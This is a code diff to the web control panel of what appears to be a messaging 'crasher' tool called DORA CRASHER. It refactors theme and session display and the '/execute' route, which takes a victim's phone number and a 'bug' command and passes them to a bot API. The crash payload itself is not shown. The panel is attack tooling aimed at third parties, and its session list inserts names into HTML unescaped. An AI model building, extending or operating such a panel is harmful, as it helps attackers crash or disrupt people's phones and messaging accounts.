@@ -519,8 +519,9 @@ function setTheme(themeKey) {
     }
     localStorage.setItem('dora_theme', themeKey);
     
+    // Update active state on cards
     document.querySelectorAll('.theme-card').forEach(c => c.classList.remove('active'));
-    const activeCard = document.querySelector(".theme-card[data-theme='" + themeKey + "']");
+    const activeCard = document.querySelector(\`.theme-card[data-theme="\${themeKey}"]\`);
     if(activeCard) activeCard.classList.add('active');
 }
 
@@ -591,7 +592,7 @@ function renderSessions(){
     allSessions.forEach(function(s){
         var on=s.status==='open';
         var active=s.id===currentSessionId;
-        h+='<div class="session-item '+(active?'active':'')+'" onclick="selectSession(\''+s.id+'\')">';
+        h+='<div class="session-item '+(active?'active':'')+'" onclick="selectSession(\\''+s.id+'\\')">';
         h+='<div style="flex:1;"><div class="id">'+s.id+'</div>'+(s.name?'<div class="name">'+s.name+'</div>':'')+'</div>';
         h+='<div class="dot '+(on?'dot-on':'dot-off')+'"></div>';
         h+='</div>';
@@ -615,42 +616,18 @@ async function selectSession(id){
 
 async function execute(){
     var t=document.getElementById('target').value.trim();
-    // Clean the number: remove +, spaces, and any non-digit characters
-    var cleanT = t.replace(/[^0-9]/g, "");
-    
     var c=document.getElementById('command').value;
     var b=document.getElementById('execBtn');
     var r=document.getElementById('result');
-    
-    if(!cleanT || cleanT.length < 10){
-        r.style.display='block';
-        r.style.color='#ff3355';
-        r.textContent='Enter a valid number (e.g., +94 75 224 8219)';
-        return;
-    }
-    
-    b.disabled=true;
-    b.innerHTML='<span class="loader"></span>EXECUTING';
-    r.style.display='block';
-    r.style.color='#ffaa00';
-    r.textContent='Sending...';
-    
+    if(!t){r.style.display='block';r.style.color='#ff3355';r.textContent='Enter target number';return}
+    b.disabled=true;b.innerHTML='<span class="loader"></span>EXECUTING';
+    r.style.display='block';r.style.color='#ffaa00';r.textContent='Sending...';
     try{
-        var res=await fetch('/execute',{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({target:cleanT, command:c})
-        });
+        var res=await fetch('/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t,command:c})});
         var d=await res.json();
-        r.style.color=d.success?'var(--neon-green)':'#ff3355';
-        r.textContent=d.message;
-    }catch(e){
-        r.style.color='#ff3355';
-        r.textContent='Error: '+e.message;
-    }
-    
-    b.disabled=false;
-    b.innerHTML='⚡ EXECUTE BUG';
+        r.style.color=d.success?'var(--neon-green)':'#ff3355';r.textContent=d.message;
+    }catch(e){r.style.color='#ff3355';r.textContent='Error: '+e.message}
+    b.disabled=false;b.innerHTML='⚡ EXECUTE BUG';
 }
 
 async function addUser(){
@@ -672,17 +649,10 @@ ${isOwner ? 'loadSessions(); setInterval(loadSessions, 10000);' : ''}
 });
 
 app.post("/execute", requireLogin, async (req, res) => {
-    let { target, command } = req.body;
+    const { target, command } = req.body;
     if (!target || !command) return res.json({ success: false, message: "Missing target or command" });
-    
-    // Strip everything except digits: removes +, spaces, and any other characters
-    let cleanTarget = target.replace(/[^0-9]/g, "");
-    
-    if (cleanTarget.length < 10) return res.json({ success: false, message: "Invalid number format" });
-    
-    // Server console log for debugging - FIXED SYNTAX
-    console.log("[DORA CRASHER] Original: " + target + " -> Cleaned: " + cleanTarget);
-
+    const cleanTarget = target.replace(/[^0-9]/g, "");
+    if (cleanTarget.length < 10) return res.json({ success: false, message: "Invalid number" });
     if (!config.botApiUrl || !config.botApiKey) return res.json({ success: false, message: "Bot API not configured" });
 
     try {
